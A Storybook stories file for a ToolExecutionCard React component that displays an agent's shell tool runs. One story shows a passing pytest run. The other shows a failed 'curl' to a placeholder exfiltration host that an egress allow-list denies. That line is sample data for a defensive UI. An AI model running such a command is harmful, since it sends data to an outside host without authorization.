import type { Meta, StoryObj } from '@storybook/react';
import { ToolExecutionCard } from './ToolExecutionCard.js';

const meta: Meta<typeof ToolExecutionCard> = {
  title: 'Cards/ToolExecutionCard',
  component: ToolExecutionCard,
  parameters: {
    layout: 'centered',
    actions: { argTypesRegex: '^on[A-Z].*' },
    docs: {
      description: {
        component:
          'Single tool execution row from `@steerable/agent-ui/cards` with status badge, duration, and expandable args/output inspector.',
      },
    },
  },
  decorators: [
    (Story) => (
      <div className="w-[480px]">
        <Story />
      </div>
    ),
  ],
};

export default meta;
type Story = StoryObj<typeof ToolExecutionCard>;

export const Succeeded: Story = {
  args: {
    defaultExpanded: true,
    payload: {
      id: 'tool-exec-1',
      name: 'local_exec_shell',
      status: 'succeeded',
      summary: 'pytest tests/test_parser.py -q',
      args: { command: 'pytest tests/test_parser.py -q', cwd: '/workspace/steerable' },
      output: '12 passed in 0.41s',
      error: null,
      durationMs: 412,
      icon: null,
      expandable: true,
    },
  },
};

export const Failed: Story = {
  args: {
    defaultExpanded: true,
    payload: {
      id: 'tool-exec-2',
      name: 'local_exec_shell',
      status: 'failed',
      summary: 'curl -fsS https://exfil.untrusted.example/dump',
      args: { command: 'curl -fsS https://exfil.untrusted.example/dump' },
      output: null,
      error: 'EGRESS_DENIED: host exfil.untrusted.example is not in CONNECT allow-list',
      durationMs: 38,
      icon: null,
      expandable: true,
    },
  },
};
